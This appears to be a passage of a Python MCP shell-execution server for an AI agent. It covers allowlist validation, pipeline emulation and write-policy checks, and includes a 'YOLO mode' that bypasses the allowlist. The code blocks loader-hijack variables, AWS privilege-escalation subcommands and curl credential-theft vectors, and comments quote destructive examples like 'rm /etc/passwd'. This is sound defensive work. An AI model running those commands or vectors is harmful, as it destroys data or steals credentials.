#!/usr/bin/env python3
"""
MCP server that provides shell command execution functionality.
"""

import asyncio
import json
import subprocess
import sys
import os
import re
import glob
import time
import shlex
from typing import Dict, Any, Optional

# Shell keywords that begin compound constructs requiring a shell interpreter
_COMPOUND_STARTERS = frozenset({'for', 'while', 'until', 'if', 'case', 'select'})

# All shell keywords (structural tokens that are never standalone executables)
_SHELL_KEYWORDS = frozenset({
    'for', 'while', 'until', 'if', 'then', 'else', 'elif', 'fi',
    'do', 'done', 'case', 'esac', 'in', 'select',
    'function', 'return', 'break', 'continue',
})

# Environment-variable assignments that may legitimately appear as a
# command prefix (e.g. ``FOO=bar make``).  These names are blocked
# because they can hijack dynamic loading or auditing to inject
# arbitrary code into otherwise-allowed binaries.
_BLOCKED_ENV_PREFIXES = frozenset({
    'LD_PRELOAD', 'LD_AUDIT', 'LD_LIBRARY_PATH',
    'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
    'DYLD_FALLBACK_LIBRARY_PATH',
})

# Matches a single ``NAME=value`` token at the start of a command, where
# value is unquoted/quoted/empty.  Used to peel env prefixes off both
# the validation string and the tokenized argv.
_ENV_ASSIGN_RE = re.compile(r'^([A-Za-z_][A-Za-z0-9_]*)=')


def _clean_child_env(extra: dict | None = None) -> dict:
    """Return a copy of os.environ safe to hand to child processes.

    macOS injects the ``Malloc*`` debug-allocator variables
    (``MallocStackLogging``, ``MallocScribble``, ``MallocGuardEdges``, …)
    into a process's environment when it is launched under Xcode,
    Instruments, the ``leaks``/``malloc_history`` tools, or a
    debugger-attached IDE terminal.  Children inherit them and the
    allocator prints noisy warnings on startup/teardown such as
    "MallocStackLogging: can't turn off malloc stack logging because it
    was not enabled."  We never set these ourselves, so strip the whole
    family from the environment passed to children; this is cosmetic and
    does not affect any command's behavior.  ``extra`` (peeled
    ``VAR=value`` prefixes / pipeline-local vars) is applied last.
    """
    env = {k: v for k, v in os.environ.items() if not k.startswith('Malloc')}
    if extra:
        env.update(extra)
    return env


def _consume_assignment_with_subst(segment: str) -> str | None:
    """Consume a full VAR=$(...) or VAR="$(...)" token from *segment*.

    shlex.split doesn't understand $() as a grouping construct, so it
    incorrectly splits `VAR=$(cmd arg1 arg2)` into multiple tokens.
    This helper manually tracks parenthesis depth (respecting quotes)
    to find the true boundary of the assignment.

    Returns the full raw token (e.g. 'f=$(find . | head -1)') or None
    if the structure can't be parsed.
    """
    eq_pos = segment.index('=')
    i = eq_pos + 1
    # Skip optional leading double-quote: VAR="$(...)"
    has_outer_dquote = i < len(segment) and segment[i] == '"'
    if has_outer_dquote:
        i += 1
    if i + 1 >= len(segment) or segment[i:i+2] != '$(':
        return None
    paren_depth = 0
    in_sq = False
    in_dq = False
    while i < len(segment):
        ch = segment[i]
        if ch == '\\' and i + 1 < len(segment) and not in_sq:
            i += 2
            continue
        if ch == "'" and not in_dq:
            in_sq = not in_sq
        elif ch == '"' and not in_sq:
            in_dq = not in_dq
        elif not in_sq and not in_dq:
            if ch == '(' and i > 0 and segment[i-1] == '$':
                paren_depth += 1
            elif ch == '(' and paren_depth > 0:
                paren_depth += 1
            elif ch == ')' and paren_depth > 0:
                paren_depth -= 1
                if paren_depth == 0:
                    end = i + 1
                    if has_outer_dquote and end < len(segment) and segment[end] == '"':
                        end += 1
                    return segment[:end]
        i += 1
    return None  # unbalanced parens


# Import centralized shell configuration
# Go up two levels: shell_server.py -> mcp_servers/ -> app/ -> site-packages (or project root)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from app.config.shell_config import get_default_shell_config
from app.config.write_policy import WritePolicyManager
from app.mcp_servers.write_policy import ShellWriteChecker, _strip_heredoc_bodies

# Heredoc redirection: "<<DELIM\n", "<<-DELIM\n", "<< 'DELIM'\n", '<< "DELIM"\n'.
# Kept in lockstep with write_policy._strip_heredoc_bodies so detection and
# stripping agree on what counts as a heredoc. A heredoc body is stdin *data*,
# not executable commands, so a command using one must be handed to a real
# shell (sh -c); the manual shell=False orchestrator cannot feed a body to
# stdin and would pass "<<DELIM" plus every body line as literal argv.
_HEREDOC_RE = re.compile(r"""<<-?\s*(?:'[^']+'|"[^"]+"|\S+)\n""", re.MULTILINE)


def _has_heredoc(command: str) -> bool:
    return bool(_HEREDOC_RE.search(command))


class ShellServer:
    """MCP server that provides shell command execution tools."""
    
    def __init__(self):
        self.request_id = 0
        
        # Yolo mode — bypass command allowlist (except always_blocked)
        self.yolo_mode = os.environ.get('YOLO_MODE', 'false').lower() in ('true', '1', 'yes')

        # Use centralized configuration (merged with plugin provider additions)
        self._effective_config = get_default_shell_config()
        self.allowed_commands = self._effective_config["allowedCommands"].copy()

        # Write policy
        self.wp_manager = WritePolicyManager()
        self.wp_manager.merge_env_overrides(dict(os.environ))
        self.write_checker = ShellWriteChecker(self.wp_manager)

        # Get configuration from environment
        self.git_operations_enabled = os.environ.get('GIT_OPERATIONS_ENABLED', 'true').lower() in ('true', '1', 'yes')
        self.command_timeout = int(os.environ.get('COMMAND_TIMEOUT', '30'))  # Increased from 10 to 30 seconds
        
        # Hard ceiling for model-requested timeouts (matches TOOL_EXEC_TIMEOUT in streaming_tool_executor)
        self.max_timeout = int(os.environ.get('MAX_COMMAND_TIMEOUT', '300'))
        
        # Default pattern for commands: command name followed by optional arguments
        self.default_command_pattern = r"^{cmd}(\s+.*)?$"
        
        # Command pattern overrides for commands that need special handling
        self.command_pattern_overrides = {
            # Add any special pattern overrides here if needed
        }
        
        # Get additional allowed commands from environment (legacy support)
        env_commands = os.environ.get('ALLOW_COMMANDS', '').split(',')
        env_commands = [cmd.strip() for cmd in env_commands if cmd.strip()]
        
        # Add environment commands to allowed commands list
        for cmd in env_commands:
            if cmd and cmd not in self.allowed_commands:
                self.allowed_commands.append(cmd)

        # Add destructive commands (rm, mv, cp, mkdir, etc.) to the allowlist
        # so they pass the command-name gate.  The write policy checker
        # (ShellWriteChecker._destructive) validates their *target paths*
        # against safe_write_paths / allowed_write_patterns, so these are
        # only permitted when operating on declared-safe areas.
        for cmd in self.wp_manager.policy.get('destructive_commands', []):
            if cmd not in self.allowed_commands:
                self.allowed_commands.append(cmd)

        # Add interpreters to command allowlist
        for interp in self.wp_manager.policy.get('allowed_interpreters', []):
            if interp not in self.allowed_commands:
                self.allowed_commands.append(interp)

        # Build safe command patterns dynamically from allowed commands
        self.safe_command_patterns = self._build_safe_command_patterns()

        # Add git operations if enabled
        if self.git_operations_enabled:
            safe_git_ops = os.environ.get('SAFE_GIT_OPERATIONS', 'status,log,show,diff,branch,remote,ls-files,blame').split(',')
            safe_git_ops = [op.strip() for op in safe_git_ops if op.strip()]
            
            self.git_patterns = {
                'status': r'^git\s+status(\s+.*)?$',
                'log': r'^git\s+log(\s+.*)?$',
                'show': r'^git\s+show(\s+.*)?$',
                'diff': r'^git\s+diff(\s+.*)?$',
                'branch': r'^git\s+branch(\s+(?!-[dD]|--delete).*)?$',  # Allow branch listing, not deletion
                'remote': r'^git\s+remote(\s+(?!rm|remove).*)?$',  # Allow remote listing, not removal
                'config --get': r'^git\s+config\s+--get(\s+.*)?$',  # Only allow getting config, not setting
                'ls-files': r'^git\s+ls-files(\s+.*)?$',
                'ls-tree': r'^git\s+ls-tree(\s+.*)?$',
                'blame': r'^git\s+blame(\s+.*)?$',
                'tag': r'^git\s+tag(\s+(?!-[dD]|--delete).*)?$',  # Allow tag listing, not deletion
                'stash list': r'^git\s+stash\s+list(\s+.*)?$',
                'reflog': r'^git\s+reflog(\s+.*)?$',
                'rev-parse': r'^git\s+rev-parse(\s+.*)?$',
                'describe': r'^git\s+describe(\s+.*)?$',
                'shortlog': r'^git\s+shortlog(\s+.*)?$',
                'whatchanged': r'^git\s+whatchanged(\s+.*)?$',
            }
            
            # Only add enabled git operations
            for op in safe_git_ops:
                if op in self.git_patterns:
                    self.safe_command_patterns[f'git_{op.replace(" ", "_").replace("-", "_")}'] = self.git_patterns[op]
                    # Also add to allowed commands list for display purposes
                    if op not in self.allowed_commands and f'git {op}' not in self.allowed_commands:
                        self.allowed_commands.append(f'git {op}')

        print(f"Shell server starting with {len(self.safe_command_patterns)} allowed command patterns", file=sys.stderr)
        available_commands = ', '.join(sorted(set([p.split('_')[0] if '_' in p else p for p in self.safe_command_patterns.keys()])))
        print(f"Available commands: {available_commands}", file=sys.stderr)
        print(f"YOLO mode: {self.yolo_mode}", file=sys.stderr)
        print(f"Git operations enabled: {self.git_operations_enabled}", file=sys.stderr)
        print(f"Safe write paths: {self.wp_manager.policy.get('safe_write_paths', [])}", file=sys.stderr)
        print(f"Write patterns: {self.wp_manager.policy.get('allowed_write_patterns', [])}", file=sys.stderr)
        print(f"Interpreters: {self.wp_manager.policy.get('allowed_interpreters', [])}", file=sys.stderr)
        
    @staticmethod
    def _expandvars_with(text: str, mapping: dict) -> str:
        """Expand $VAR / ${VAR} using the given mapping instead of os.environ.

        Mirrors os.path.expandvars' quote-naive behavior (it expands inside
        quotes too) so callers get consistent semantics whether or not
        pipeline-local variables are in play.  Unknown names are left
        untouched, matching the stdlib expander.
        """
        def _repl(m: 're.Match') -> str:
            name = m.group(1) or m.group(2)
            return mapping.get(name, m.group(0))
        return re.sub(r'\$(\w+)|\$\{(\w+)\}', _repl, text)

    def _expand_and_tokenize(self, cmd_segment: str, extra_env: dict | None = None) -> list:
        """Expand shell features in Python and tokenize into an args list.

        Handles environment variables, tilde expansion, and glob patterns
        so that subprocess can be called with shell=False.
        """
        # Expand environment variables ($VAR, ${VAR}) before tokenizing.
        # When pipeline-local shell variables are supplied, expand against a
        # merged view (os.environ overlaid with them) so assignments earlier
        # in the same command are visible; otherwise defer to the stdlib
        # expander to preserve its exact semantics.
        if extra_env:
            expanded = self._expandvars_with(cmd_segment, {**os.environ, **extra_env})
        else:
            expanded = os.path.expandvars(cmd_segment)

        try:
            tokens = shlex.split(expanded)
        except ValueError as e:
            # Malformed quoting — fall back to naive whitespace split
            print(f"shlex.split failed ({e}), falling back to split()", file=sys.stderr)
            tokens = expanded.split()

        if not tokens:
            return tokens

        # Apply tilde expansion and glob expansion per-token (after splitting)
        tokens = [os.path.expanduser(t) for t in tokens]
        result = [tokens[0]]
        for arg in tokens[1:]:
            if any(ch in arg for ch in ('*', '?', '[')):
                matches = glob.glob(arg)
                if matches:
                    result.extend(sorted(matches))
                else:
                    # No matches — pass the literal pattern (matches bash behavior)
                    result.append(arg)
            else:
                result.append(arg)

        return result

    @staticmethod
    def _peel_env_prefix(cmd_segment: str) -> tuple:
        """Strip leading ``NAME=value`` env assignments from a command segment.

        Returns ``(cleaned_segment, env_dict, denial_reason)``.  If any
        peeled name is in ``_BLOCKED_ENV_PREFIXES`` the denial_reason is
        populated and the caller should reject the command.  ``env_dict``
        contains the accepted assignments so the executor can pass them
        to subprocess.
        """
        env: dict = {}
        remaining = cmd_segment.lstrip()
        while True:
            m = _ENV_ASSIGN_RE.match(remaining)
            if not m:
                break
            name = m.group(1)
            if name in _BLOCKED_ENV_PREFIXES:
                return remaining, {}, (
                    f"environment variable '{name}' cannot be set as a "
                    f"command prefix (blocked dynamic-loader hijack vector)"
                )
            # Tokenize just enough to consume one VAR=value pair (handles
            # quoted values).  shlex doesn't understand $(...) grouping,
            # so if the value starts with $( we manually find the matching
            # closing paren before falling back to shlex.
            eq_pos = remaining.index('=')
            after_eq = remaining[eq_pos + 1:]
            if after_eq.startswith('$(') or after_eq.startswith('"$('):
                tok = _consume_assignment_with_subst(remaining)
                if tok is not None:
                    env[name] = tok.split('=', 1)[1]
                    remaining = remaining[len(tok):].lstrip()
                    continue
            # Tokenize just enough to consume one VAR=value pair (handles
            # quoted values).  shlex with posix=True respects quotes.
            try:
                tok = shlex.split(remaining, posix=True)[0]
            except ValueError:
                # Unbalanced quotes — let downstream handling deal with it
                break
            value = tok.split('=', 1)[1]
            env[name] = value
            # Drop the raw token (incl. its trailing whitespace) from
            # the remaining string.
            remaining = remaining[len(tok):].lstrip()
        return remaining, env, ""

    def _is_compound_command(self, command: str) -> bool:
        """Check if any pipeline segment is a compound shell construct.

        Compound constructs (for/while/if/case/select) can appear after
        other commands (e.g. ``cd dir && for f in *; do …; done``).  The
        first word of the whole command is ``cd`` there, so inspecting only
        the command's very first token missed the loop and routed it to the
        manual shell=False pipeline orchestrator, which split the construct
        on ``;``/``&&`` and tried to exec ``for`` as a binary
        (``No such file or directory: 'for'``).  Inspect the first word of
        every operator-split segment instead.
        """
        for _operator, segment in self._split_by_shell_operators(command):
            words = segment.strip().split()
            if words and words[0] in _COMPOUND_STARTERS:
                return True
        return False

    def _validate_compound_body(self, command: str) -> tuple:
        """Validate commands inside a compound shell construct.

        Splits the compound into segments, strips shell keywords, and
        checks the actual commands against the allowlist.
        Returns (allowed: bool, denial_reason: str).
        """
        # Split into fine-grained segments by ; \n && || |
        parts = re.split(r'[;\n]|\s*\&\&\s*|\s*\|\|\s*|\s*\|\s*', command)

        for part in parts:
            part = part.strip()
            if not part:
                continue
            words = part.split()
            if not words:
                continue

            # Strip leading shell keywords to find the real command
            idx = 0
            while idx < len(words) and words[idx] in _SHELL_KEYWORDS:
                # A 'for X in LIST' header (and the C-style 'for ((...))')
                # contains only loop data -- the loop variable and the
                # iteration word-list -- never a runnable command.  The body
                # lives in a later segment after 'do' (segments are pre-split
                # on ; \n && || |).  So consume the whole segment on 'for'.
                if words[idx] == 'for':
                    idx = len(words)
                    break
                idx += 1

            if idx >= len(words):
                continue

            cmd_word = words[idx]

            # Variable assignment (var=...) — not a command invocation
            if '=' in cmd_word and not cmd_word.startswith('=') and not cmd_word.startswith('-'):
                continue

            # Validate the command against the allowlist
            test_cmd = ' '.join(words[idx:])
            segment_ok = any(
                re.match(p, test_cmd, re.IGNORECASE)
                for p in self.safe_command_patterns.values()
            )
            if not segment_ok:
                return False, f"'{cmd_word}' is not allowed"

        # Validate $() and backtick substitutions
        for sub in re.findall(r'\$\(([^)]+)\)', command) + re.findall(r'`([^`]+)`', command):
            sub_ok, sub_reason = self.is_command_allowed(sub.strip())
            if not sub_ok:
                return False, sub_reason

        return True, ""

    @staticmethod
    def _extract_redirections(args: list) -> tuple:
        """Extract shell-style redirections from tokenized args.

        Returns (cleaned_args, subprocess_kwargs) where subprocess_kwargs
        contains stdout/stderr overrides for subprocess.run().

        Supported redirections:
          2>&1           -> stderr=subprocess.STDOUT
          2>/dev/null    -> stderr=subprocess.DEVNULL
          >/dev/null     -> stdout=subprocess.DEVNULL
          1>/dev/null    -> stdout=subprocess.DEVNULL
        """
        cleaned = []
        kwargs = {}
        skip_next = False

        for i, arg in enumerate(args):
            if skip_next:
                skip_next = False
                continue

            # 2>&1  (may appear as one token or shlex may keep it as-is)
            if arg == '2>&1':
                kwargs['stderr'] = subprocess.STDOUT
            # 2>/dev/null  — single token
            elif arg == '2>/dev/null':
                kwargs['stderr'] = subprocess.DEVNULL
            # 2> /dev/null — split across two tokens
            elif arg == '2>' and i + 1 < len(args) and args[i + 1] == '/dev/null':
                kwargs['stderr'] = subprocess.DEVNULL
                skip_next = True
            # >/dev/null or 1>/dev/null — single token
            elif arg in ('>/dev/null', '1>/dev/null'):
                kwargs['stdout'] = subprocess.DEVNULL
            # > /dev/null or 1> /dev/null — split across two tokens
            elif arg in ('>', '1>') and i + 1 < len(args) and args[i + 1] == '/dev/null':
                kwargs['stdout'] = subprocess.DEVNULL
                skip_next = True
            else:
                cleaned.append(arg)

        return cleaned, kwargs

    def _resolve_substitutions(self, cmd_segment: str, timeout: float, cwd: str,
                               extra_env: dict | None = None) -> str:
        """Resolve $(...) and backtick command substitutions by executing them."""
        import re as _re

        def _run_substitution(inner_cmd: str) -> str:
            args = self._expand_and_tokenize(inner_cmd, extra_env)
            if not args:
                return ""
            try:
                r = subprocess.run(
                    args, shell=False, capture_output=True, text=True,
                    timeout=timeout,
                    env=_clean_child_env(extra_env),
                    cwd=cwd if cwd and os.path.isdir(cwd) else None,
                )
                return r.stdout.rstrip("\n")
            except Exception as exc:
                print(f"Substitution failed for '{inner_cmd}': {exc}", file=sys.stderr)
                return ""

        # Replace $(...) — outermost only (non-greedy, no nested parens)
        result = _re.sub(
            r'\$\(([^)]+)\)',
            lambda m: _run_substitution(m.group(1)),
            cmd_segment,
        )
        # Replace `...`
        result = _re.sub(
            r'`([^`]+)`',
            lambda m: _run_substitution(m.group(1)),
            result,
        )
        return result

    @staticmethod
    def _expand_special_params(cmd_segment: str, exit_status: int) -> str:
        """Substitute shell special parameters that ``os.path.expandvars`` leaves
        literal because they are not valid environment-variable names.

        ``expandvars`` only expands ``$NAME``/``${NAME}`` where NAME is a normal
        identifier, so ``$?`` (last exit status), ``$$`` (shell PID), and ``$!``
        (last background PID) pass straight through unexpanded — ``echo $?`` would
        return the literal text ``$?``.  This expands those three, matching both
        the ``$x`` and ``${x}`` forms.

        ``exit_status`` is the return code of the previous pipeline segment.
        Negative codes (Python reports a process killed by signal N as ``-N``)
        are mapped to bash's ``128 + N`` convention so ``$?`` reads as it would
        in a real shell.  Quote-naive on purpose, matching the existing
        ``expandvars`` behavior elsewhere in this module.
        """
        import re

        status = exit_status if exit_status >= 0 else 128 + abs(exit_status)
        replacements = {
            '?': str(status),
            '$': str(os.getpid()),  # the orchestrator emulates the shell process
            '!': '',                # background jobs are unsupported
        }
        return re.sub(
            r'\$\{?([?$!])\}?',
            lambda m: replacements[m.group(1)],
            cmd_segment,
        )

    def _execute_pipeline(self, command: str, timeout: float, cwd: str) -> subprocess.CompletedProcess:
        """Execute a command pipeline with shell=False for all subprocess calls.

        Handles pipes (|), conditional chaining (&&, ||), and sequential
        execution (;) by orchestrating individual subprocess.run() calls.
        """
        effective_cwd = cwd if cwd and os.path.isdir(cwd) else None
        segments = self._split_by_shell_operators(command)

        # Compound shell constructs (for/while/if/case/select) require a
        # shell interpreter — they aren't standalone executables.
        if self._is_compound_command(command):
            return subprocess.run(
                ['sh', '-c', command],
                shell=False,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=effective_cwd,
            )

        # Heredoc redirection (cmd <<EOF ... EOF) also requires a real
        # shell: the manual orchestrator below runs each segment with
        # shell=False and cannot feed a heredoc body to stdin, so it
        # would pass "<<EOF" and every body line as literal argv. The
        # body is stdin *data*, not commands, so routing the whole
        # command to sh -c does not widen the executable surface — and
        # is_command_allowed has already validated every command segment
        # (with bodies stripped) before we reach here.
        if _has_heredoc(command):
            return subprocess.run(
                ['sh', '-c', command],
                shell=False,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=effective_cwd,
            )

        last_result = None
        accumulated_stdout = ""
        accumulated_stderr = ""
        # Pipeline-local shell variables.  A bare NAME=value segment
        # (no trailing command) sets one here so later segments -- and
        # command substitutions within them -- can expand $NAME.  These
        # stay local to this command invocation and are used for expansion
        # only (not injected into child env) to match a shell's treatment
        # of non-exported variables.
        shell_vars: dict = {}

        for idx, (operator, cmd_segment) in enumerate(segments):
            # Resolve command substitutions first
            resolved = self._resolve_substitutions(cmd_segment, timeout, cwd, shell_vars)
            # Expand shell special parameters ($?, $$, $!) using the previous
            # segment's exit status. Bash treats $? as 0 before any command has
            # run, so default to 0 for the first segment. Must happen before
            # tokenization (expandvars in _expand_and_tokenize leaves these literal).
            _prev_rc = last_result.returncode if last_result is not None else 0
            resolved = self._expand_special_params(resolved, _prev_rc)
            # Peel ``VAR=value`` prefixes so they go to subprocess(env=)
            # rather than being tokenized as argv[0].  Validation already
            # rejected blocked names, so any reason returned here is a
            # belt-and-suspenders no-op.
            resolved, segment_env, _ = self._peel_env_prefix(resolved)
            # Expand using pipeline-local vars plus this segment's own inline
            # VAR=value cmd prefix (the latter wins for the segment).
            args = self._expand_and_tokenize(resolved, {**shell_vars, **segment_env})
            if not args:
                # A bare assignment (no command): record it for later
                # segments rather than discarding it, then move on.
                if segment_env:
                    shell_vars.update(segment_env)
                continue
            
            # Handle `cd` in-process: update effective_cwd for subsequent
            # segments instead of spawning a subprocess (which would change
            # directory only in its own process and immediately exit).
            if args[0] == 'cd':
                target = args[1] if len(args) > 1 else os.path.expanduser('~')
                # Resolve relative paths against the current effective cwd.
                if not os.path.isabs(target):
                    target = os.path.join(effective_cwd or os.getcwd(), target)
                target = os.path.normpath(target)
                if os.path.isdir(target):
                    effective_cwd = target
                    last_result = subprocess.CompletedProcess(args=args, returncode=0, stdout='', stderr='')
                else:
                    last_result = subprocess.CompletedProcess(args=args, returncode=1, stdout='', stderr=f'cd: {target}: No such file or directory\n')
                accumulated_stderr += last_result.stderr
                continue

            # Extract redirections (2>&1, >/dev/null, etc.) from args
            args, redir_kwargs = self._extract_redirections(args)

            # Conditional chaining: skip based on previous result
            if operator == "&&" and last_result and last_result.returncode != 0:
                continue
            if operator == "||" and last_result and last_result.returncode == 0:
                continue

            stdin_data = None
            if operator == "|" and last_result:
                stdin_data = last_result.stdout

            # Build subprocess kwargs, letting explicit redirections override defaults
            run_kwargs = dict(
                shell=False, capture_output=False, text=True,
                timeout=timeout, cwd=effective_cwd, input=stdin_data,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            # Merge any peeled env assignments onto the parent env for
            # this segment only.  Each segment in the pipeline gets its
            # own merged copy — assignments do not leak across segments.
            if segment_env:
                merged_env = os.environ.copy()
                merged_env.update(segment_env)
                run_kwargs['env'] = merged_env
            run_kwargs.update(redir_kwargs)

            last_result = subprocess.run(
                args, **run_kwargs,
            )

            # Check if the next segment will pipe from this one
            next_is_pipe = (idx + 1 < len(segments) and segments[idx + 1][0] == "|")
            if operator == "|" or next_is_pipe:
                # In a pipe, only keep stderr; stdout feeds the next stage
                accumulated_stderr += last_result.stderr or ""
            else:
                accumulated_stdout += last_result.stdout or ""
                accumulated_stderr += last_result.stderr or ""

        if last_result is None:
            return subprocess.CompletedProcess(
                args=command, returncode=1,
                stdout="", stderr="No executable segments",
            )

        # For pipes, the final stage's stdout is the pipeline output
        if any(op == "|" for op, _ in segments):
            accumulated_stdout += last_result.stdout or ""

        return subprocess.CompletedProcess(
            args=command, returncode=last_result.returncode,
            stdout=accumulated_stdout, stderr=accumulated_stderr,
        )

    def _split_by_shell_operators(self, command: str) -> list[tuple[str, str]]:
        """
        Split a command by shell operators while preserving the operators.
        Returns a list of (operator, command) tuples.
        First tuple has empty operator string.
        
        Handles: &&, ||, ;, | (pipe), and command substitution $(...)
        Respects backslash escaping (e.g., \\; in find -exec)
        """
        segments = []
        current_segment = ""
        current_operator = ""
        i = 0
        in_single_quote = False
        in_double_quote = False
        in_backtick = False
        paren_depth = 0
        
        while i < len(command):
            char = command[i]
            next_char = command[i + 1] if i + 1 < len(command) else ''
            
            # Handle backslash escaping first
            if char == '\\' and i + 1 < len(command):
                next_next_char = command[i + 1]
                # Backslash-newline is shell line continuation: consume both
                # characters and emit nothing, joining the two physical lines
                # into one logical command. (Inside single quotes a backslash
                # is literal, so leave it intact there.)
                if next_next_char == '\n' and not in_single_quote:
                    i += 2
                    continue
                # If we're escaping a backtick, treat it as literal
                if next_next_char == '`':
                    current_segment += char + next_next_char
                    i += 2
                    continue
            
            # Handle quotes
            if char == "'" and not in_double_quote and not in_backtick:
                in_single_quote = not in_single_quote
                current_segment += char
                i += 1
                continue
            elif char == '"' and not in_single_quote and not in_backtick:
                in_double_quote = not in_double_quote
                current_segment += char
                i += 1
                continue
            elif char == '`' and not in_single_quote and not in_double_quote:
                in_backtick = not in_backtick
                current_segment += char
                i += 1
                continue
            
            # Track command substitution depth $(...) 
            if not in_single_quote and not in_double_quote and not in_backtick:
                if char == '$' and next_char == '(':
                    paren_depth += 1
                    current_segment += char + next_char
                    i += 2
                    continue
                elif char == ')' and paren_depth > 0:
                    paren_depth -= 1
                    current_segment += char
                    i += 1
                    continue
            
            # Only detect operators outside quotes and command substitutions
            if not in_single_quote and not in_double_quote and not in_backtick and paren_depth == 0:
                # Check for escaped characters (backslash before operator)
                # In shell, \; and \| are literal characters, not operators
                if i > 0 and command[i - 1] == '\\' and char in ';|':
                    # This is an escaped operator (like \; in find -exec)
                    # Keep it as part of the current segment
                    current_segment += char
                    i += 1
                    continue
                    
                # Check for two-character operators: &&, ||
                if char in '&|' and next_char == char:
                    if current_segment.strip():
                        segments.append((current_operator, current_segment.strip()))
                    current_operator = char + next_char
                    current_segment = ""
                    i += 2
                    continue
                # Check for single-character operators: ; and |
                elif char in ';|':
                    if current_segment.strip():
                        segments.append((current_operator, current_segment.strip()))
                    current_operator = char
                    current_segment = ""
                    i += 1
                    continue
                # A bare newline separates commands like ``;`` (sequential
                # execution). Escaped newlines were already consumed above as
                # line continuations, so any newline reaching here is a real
                # separator — normalize it to ``;``.
                elif char == '\n':
                    if current_segment.strip():
                        segments.append((current_operator, current_segment.strip()))
                    current_operator = ';'
                    current_segment = ""
                    i += 1
                    continue
            
            current_segment += char
            i += 1
        
        # Add final segment
        if current_segment.strip():
            segments.append((current_operator, current_segment.strip()))
        
        return segments
    
    def is_command_allowed(self, command: str) -> tuple:
        """
        Check if a command matches any of the allowed patterns.
        Also validates all commands in chains (&&, ||, ;, |) and substitutions.
        Returns (allowed: bool, denial_reason: str).
        """
        if not command or not command.strip():
            return False, "Empty command"
        
        command = command.strip()

        # Heredoc commands span multiple physical lines and must NOT be
        # truncated to the first line below: the body is stdin *data*, but
        # a real command may be sequenced after the terminator
        # (e.g. ``cat <<EOF .. EOF; rm /etc/passwd``). Execution routes
        # heredocs to a real shell (see _execute_pipeline), so we must
        # validate every command that shell would run. Strip the heredoc
        # bodies, then validate each remaining command line against the
        # allowlist. Compound constructs (if/while/...) are excluded — they
        # keep their dedicated _validate_compound_body path below.
        if _has_heredoc(command) and not self._is_compound_command(command):
            stripped = _strip_heredoc_bodies(command)
            for hd_line in stripped.split('\n'):
                hd_line = hd_line.strip()
                if not hd_line or hd_line.startswith('#'):
                    continue
                ok, reason = self.is_command_allowed(hd_line)
                if not ok:
                    return False, reason
            return True, ""

        # Strip whole-line shell comments, then KEEP every remaining line.
        # A bare newline is a command separator (the splitter normalizes it
        # to ``;``), so we must NOT truncate to the first line — doing so
        # would let a command after a newline (e.g. "echo hi\nrm -rf x")
        # execute unvalidated once _execute_pipeline runs the segments.
        # Lines joined by a trailing backslash are reassembled by the
        # splitter as line continuations, not separators.
        lines = command.split('\n')
        lines = [l for l in lines if not l.lstrip().startswith('#')]
        command = '\n'.join(lines).strip()
        if not command:
            return False, "Command is only comments"

        # Compound shell constructs get dedicated validation that inspects
        # the body commands rather than naively splitting on `;`.
        if self._is_compound_command(command):
            if not self.yolo_mode:
                return self._validate_compound_body(command)
            # In yolo mode, fall through to the normal always_blocked check
            # (the block below handles it)

        # YOLO mode — allow everything except always_blocked commands
        if self.yolo_mode:
            always_blocked = self.wp_manager.policy.get('always_blocked', [])
            # Include bare newlines as separators: a newline acts like ``;``
            # (see _split_by_shell_operators), so "echo hi\nsudo reboot" must
            # have its second segment scanned, not hidden behind the newline.
            for token in re.split(r'\s*[|;&\n]+\s*', command):
                first_word = token.strip().split()[0] if token.strip() else ''
                if first_word in always_blocked:
                    print(f"YOLO mode: '{first_word}' is in always_blocked list", file=sys.stderr)
                    return False, f"'{first_word}' is in the always-blocked list"
            print(f"YOLO mode: allowing '{command[:80]}'", file=sys.stderr)
            return True, ""
        
        # Split by shell operators and validate each segment
        segments = self._split_by_shell_operators(command)
        
        if not segments:
            print(f"Command parsing resulted in no segments", file=sys.stderr)
            return False, "Command parsing produced no segments"
        
        print(f"Command split into {len(segments)} segment(s)", file=sys.stderr)
        
        # Validate each segment
        for i, (operator, cmd_segment) in enumerate(segments):
            if i > 0:
                print(f"Validating segment {i} after operator '{operator}': '{cmd_segment}'", file=sys.stderr)
            else:
                print(f"Validating segment {i}: '{cmd_segment}'", file=sys.stderr)

            # Peel leading ``VAR=value`` assignments so the underlying
            # command is what gets matched against the allowlist.  Reject
            # outright if any blocked loader-hijack variable is present.
            peeled_segment, _peeled_env, peel_reason = self._peel_env_prefix(cmd_segment)
            if peel_reason:
                return False, peel_reason
            if peeled_segment != cmd_segment:
                print(f"Peeled env prefix; validating: '{peeled_segment}'", file=sys.stderr)
                cmd_segment = peeled_segment

            # Block high-risk AWS CLI subcommands (IAM/STS role escalation,
            # bulk data movement, infra deploy). 'aws' is allowlisted for
            # read use, but these specific subcommands enable privilege
            # escalation or exfiltration with the developer's credentials.
            aws_block = self._aws_subcommand_blocked(cmd_segment)
            if aws_block:
                return False, aws_block

            # Block the two documented curl abuse vectors: link-local IMDS
            # credential vending and @file upload of credential files. curl
            # stays allowlisted for normal fetches.
            curl_block = self._curl_invocation_blocked(cmd_segment)
            if curl_block:
                return False, curl_block

            # Bare variable assignment with no trailing command (e.g.
            # 'f=$(find .)').  Validate any command substitution inside
            # the original segment, then allow it.
            if not cmd_segment.strip():
                original = segments[i][1]
                scan_target = re.sub(r"'[^']*'", "", original)
                scan_target = scan_target.replace(r'`', '')
                substitutions = re.findall(r'\$\(([^)]+)\)', scan_target)
                substitutions.extend(re.findall(r'`([^`]+)`', scan_target))
                for sub_cmd in substitutions:
                    if not sub_cmd.strip():
                        continue
                    sub_ok, sub_reason = self.is_command_allowed(sub_cmd)
                    if not sub_ok:
                        return False, f"'{sub_cmd.strip().split()[0]}' (in command substitution) is not allowed"
                continue
            
            # Check for command substitution in the segment
            if '$(' in cmd_segment or '`' in cmd_segment:
                # Extract and validate substituted commands.
                # Bash does not perform command substitution inside
                # single-quoted strings, and ` inside double quotes is
                # a literal backtick — both must be excluded or this
                # validator throws false positives on grep/sed patterns
                # that legitimately contain backticks.
                scan_target = re.sub(r"'[^']*'", "", cmd_segment)
                # Mask escaped backticks so they don't pair with real ones.
                scan_target = scan_target.replace(r'`', '')
